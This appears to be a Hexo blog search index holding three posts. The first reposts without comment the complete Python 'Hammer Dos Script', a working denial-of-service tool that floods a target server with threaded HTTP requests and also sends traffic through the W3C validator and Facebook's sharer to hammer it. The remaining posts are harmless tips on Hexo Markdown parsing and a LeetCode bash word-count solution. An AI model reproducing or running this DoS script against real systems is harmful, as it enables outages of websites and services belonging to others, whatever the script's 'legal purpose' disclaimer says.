<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[ISSUE]]></title>
      <url>/2017/10/08/issuse/</url>
      <content type="html"><![CDATA[<h1 id="天空之城"><a href="#天空之城" class="headerlink" title="天空之城"></a>天空之城</h1><h3 id="宫崎骏"><a href="#宫崎骏" class="headerlink" title="宫崎骏"></a>宫崎骏</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python3</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="comment"># python 3.3.2+ Hammer Dos Script v.1</span></div><div class="line"><span class="comment"># by Can Yalçın</span></div><div class="line"><span class="comment"># only for legal purpose</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</div><div class="line"><span class="keyword">import</span> time,sys,socket,threading,logging,urllib.request,random</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_agent</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> uagent</div><div class="line">	uagent=[]</div><div class="line">	uagent.append(<span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"</span>)</div><div class="line">	uagent.append(<span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0"</span>)</div><div class="line">	uagent.append(<span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"</span>)</div><div class="line">	uagent.append(<span class="string">"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"</span>)</div><div class="line">	uagent.append(<span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7"</span>)</div><div class="line">	uagent.append(<span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"</span>)</div><div class="line">	uagent.append(<span class="string">"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"</span>)</div><div class="line">	<span class="keyword">return</span>(uagent)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_bots</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> bots</div><div class="line">	bots=[]</div><div class="line">	bots.append(<span class="string">"http://validator.w3.org/check?uri="</span>)</div><div class="line">	bots.append(<span class="string">"http://www.facebook.com/sharer/sharer.php?u="</span>)</div><div class="line">	<span class="keyword">return</span>(bots)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bot_hammering</span><span class="params">(url)</span>:</span></div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			req = urllib.request.urlopen(urllib.request.Request(url,headers=&#123;<span class="string">'User-Agent'</span>: random.choice(uagent)&#125;))</div><div class="line">			print(<span class="string">"\033[94mbot is hammering...\033[0m"</span>)</div><div class="line">			time.sleep(<span class="number">.1</span>)</div><div class="line">	<span class="keyword">except</span>:</div><div class="line">		time.sleep(<span class="number">.1</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">down_it</span><span class="params">(item)</span>:</span></div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			packet = str(<span class="string">"GET / HTTP/1.1\nHost: "</span>+host+<span class="string">"\n\n User-Agent: "</span>+random.choice(uagent)+<span class="string">"\n"</span>+data).encode(<span class="string">'utf-8'</span>)</div><div class="line">			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">			s.connect((host,int(port)))</div><div class="line">			<span class="keyword">if</span> s.sendto( packet, (host, int(port)) ):</div><div class="line">				s.shutdown(<span class="number">1</span>)</div><div class="line">				<span class="keyword">print</span> (<span class="string">"\033[92m"</span>,time.ctime(time.time()),<span class="string">"\033[0m \033[94m &lt;--packet sent! hammering--&gt; \033[0m"</span>)</div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				s.shutdown(<span class="number">1</span>)</div><div class="line">				print(<span class="string">"\033[91mshut&lt;-&gt;down\033[0m"</span>)</div><div class="line">			time.sleep(<span class="number">.1</span>)</div><div class="line">	<span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</div><div class="line">		print(<span class="string">"\033[91mno connection! server maybe down\033[0m"</span>)</div><div class="line">		<span class="comment">#print("\033[91m",e,"\033[0m")</span></div><div class="line">		time.sleep(<span class="number">.1</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dos</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">		item = q.get()</div><div class="line">		down_it(item)</div><div class="line">		q.task_done()</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dos2</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">		item=w.get()</div><div class="line">		bot_hammering(random.choice(bots)+<span class="string">"http://"</span>+host)</div><div class="line">		w.task_done()</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">print</span> (<span class="string">''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/</span></div><div class="line"><span class="string">	It is the end user's responsibility to obey all applicable laws.</span></div><div class="line"><span class="string">	It is just for server testing script. Your ip is visible. \n</span></div><div class="line"><span class="string">	usage : python3 hammer.py [-s] [-p] [-t]</span></div><div class="line"><span class="string">	-h : help</span></div><div class="line"><span class="string">	-s : server ip</span></div><div class="line"><span class="string">	-p : port default 80</span></div><div class="line"><span class="string">	-t : turbo default 135 \033[0m'''</span>)</div><div class="line">	sys.exit()</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_parameters</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> host</div><div class="line">	<span class="keyword">global</span> port</div><div class="line">	<span class="keyword">global</span> thr</div><div class="line">	<span class="keyword">global</span> item</div><div class="line">	optp = OptionParser(add_help_option=<span class="keyword">False</span>,epilog=<span class="string">"Hammers"</span>)</div><div class="line">	optp.add_option(<span class="string">"-q"</span>,<span class="string">"--quiet"</span>, help=<span class="string">"set logging to ERROR"</span>,action=<span class="string">"store_const"</span>, dest=<span class="string">"loglevel"</span>,const=logging.ERROR, default=logging.INFO)</div><div class="line">	optp.add_option(<span class="string">"-s"</span>,<span class="string">"--server"</span>, dest=<span class="string">"host"</span>,help=<span class="string">"attack to server ip -s ip"</span>)</div><div class="line">	optp.add_option(<span class="string">"-p"</span>,<span class="string">"--port"</span>,type=<span class="string">"int"</span>,dest=<span class="string">"port"</span>,help=<span class="string">"-p 80 default 80"</span>)</div><div class="line">	optp.add_option(<span class="string">"-t"</span>,<span class="string">"--turbo"</span>,type=<span class="string">"int"</span>,dest=<span class="string">"turbo"</span>,help=<span class="string">"default 135 -t 135"</span>)</div><div class="line">	optp.add_option(<span class="string">"-h"</span>,<span class="string">"--help"</span>,dest=<span class="string">"help"</span>,action=<span class="string">'store_true'</span>,help=<span class="string">"help you"</span>)</div><div class="line">	opts, args = optp.parse_args()</div><div class="line">	logging.basicConfig(level=opts.loglevel,format=<span class="string">'%(levelname)-8s %(message)s'</span>)</div><div class="line">	<span class="keyword">if</span> opts.help:</div><div class="line">		usage()</div><div class="line">	<span class="keyword">if</span> opts.host <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">		host = opts.host</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		usage()</div><div class="line">	<span class="keyword">if</span> opts.port <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">		port = <span class="number">80</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		port = opts.port</div><div class="line">	<span class="keyword">if</span> opts.turbo <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">		thr = <span class="number">135</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		thr = opts.turbo</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># reading headers</span></div><div class="line"><span class="keyword">global</span> data</div><div class="line">headers = open(<span class="string">"headers.txt"</span>, <span class="string">"r"</span>)</div><div class="line">data = headers.read()</div><div class="line">headers.close()</div><div class="line"><span class="comment">#task queue are q,w</span></div><div class="line">q = Queue()</div><div class="line">w = Queue()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	<span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</div><div class="line">		usage()</div><div class="line">	get_parameters()</div><div class="line">	print(<span class="string">"\033[92m"</span>,host,<span class="string">" port: "</span>,str(port),<span class="string">" turbo: "</span>,str(thr),<span class="string">"\033[0m"</span>)</div><div class="line">	print(<span class="string">"\033[94mPlease wait...\033[0m"</span>)</div><div class="line">	user_agent()</div><div class="line">	my_bots()</div><div class="line">	time.sleep(<span class="number">5</span>)</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">		s.connect((host,int(port)))</div><div class="line">		s.settimeout(<span class="number">1</span>)</div><div class="line">	<span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</div><div class="line">		print(<span class="string">"\033[91mcheck server ip and port\033[0m"</span>)</div><div class="line">		usage()</div><div class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(int(thr)):</div><div class="line">			t = threading.Thread(target=dos)</div><div class="line">			t.daemon = <span class="keyword">True</span>  <span class="comment"># if thread is exist, it dies</span></div><div class="line">			t.start()</div><div class="line">			t2 = threading.Thread(target=dos2)</div><div class="line">			t2.daemon = <span class="keyword">True</span>  <span class="comment"># if thread is exist, it dies</span></div><div class="line">			t2.start()</div><div class="line">		start = time.time()</div><div class="line">		<span class="comment">#tasking</span></div><div class="line">		item = <span class="number">0</span></div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			<span class="keyword">if</span> (item&gt;<span class="number">1800</span>): <span class="comment"># for no memory crash</span></div><div class="line">				item=<span class="number">0</span></div><div class="line">				time.sleep(<span class="number">.1</span>)</div><div class="line">			item = item + <span class="number">1</span></div><div class="line">			q.put(item)</div><div class="line">			w.put(item)</div><div class="line">		q.join()</div><div class="line">		w.join()</div></pre></td></tr></table></figure>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[HEXO解析MD的一点小经验]]></title>
      <url>/2017/09/15/hexo-parse-md/</url>
      <content type="html"><![CDATA[<h1 id="HEXO解析MD的一点小经验"><a href="#HEXO解析MD的一点小经验" class="headerlink" title="HEXO解析MD的一点小经验"></a>HEXO解析MD的一点小经验</h1><h3 id="标签前缀后要跟空格"><a href="#标签前缀后要跟空格" class="headerlink" title="标签前缀后要跟空格"></a>标签前缀后要跟空格</h3><p>例如分割线<code>- - -</code>前缀后要跟空格，否则<code>hexo g</code>会报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at BLABLABLA</div></pre></td></tr></table></figure>
<hr>
<h3 id="渲染器差别"><a href="#渲染器差别" class="headerlink" title="渲染器差别"></a>渲染器差别</h3><p>行内代码块解析如下swig/nunjucks语法的代码时，会抛出异常：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; xxx &#125;&#125;</div><div class="line">&#123;% xxx %&#125;</div><div class="line">FATAL Something&apos;s wrong. Maybe you can find the solution here: http://hexo.io/docs/troubleshooting.html</div><div class="line">Template render error: (unknown path)</div></pre></td></tr></table></figure>
<p>解决办法使用块级代码。</p>
<hr>
<p>先这样吧，以后有新的发现会持续更新。</p>
]]></content>
      
        <categories>
            
            <category> HEXO </category>
            
        </categories>
        
        
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Leetcode 192 shellscript question]]></title>
      <url>/2017/09/15/Leetcode-shell-192/</url>
      <content type="html"><![CDATA[<h1 id="Leetcode-192-SHELLSCRIPT"><a href="#Leetcode-192-SHELLSCRIPT" class="headerlink" title="Leetcode 192 SHELLSCRIPT"></a>Leetcode 192 SHELLSCRIPT</h1><p>虽然是个老头了，但打算今天开始刷leetcode，预防老年痴呆症，先做个shell的题热热身。<br>题目如下：</p>
<hr>
<p>Write a bash script to calculate the frequency of each word in a text file <code>words.txt</code>.</p>
<p>For simplicity sake, you may assume:</p>
<ul>
<li><code>words.txt</code> contains only lowercase characters and space <code>&#39; &#39;</code> characters.</li>
<li>Each word must consist of lowercase characters only.</li>
<li>Words are separated by one or more whitespace characters.</li>
</ul>
<p>For example, assume that <code>words.txt</code> has the following content:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">the day is sunny the the</div><div class="line">the sunny is is</div></pre></td></tr></table></figure>
<p>Your script should output the following, sorted by descending frequency:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">the 4</div><div class="line">is 3</div><div class="line">sunny 2</div><div class="line">day 1</div></pre></td></tr></table></figure>
<hr>
<p>这个题目真的是热身级别的了，不过不奇怪，leetcode以算法题为主，只看shell可怜的区区四道题目可想而知多么冷门。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed <span class="string">'s/ /\n/g'</span> words.txt |sed <span class="string">'/^$/d'</span>|sort |uniq -c| sort -nr | awk <span class="string">'&#123;print $2,$1&#125;'</span></div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> shell </category>
            
        </categories>
        
        
    </entry>
    
  
  
</search>
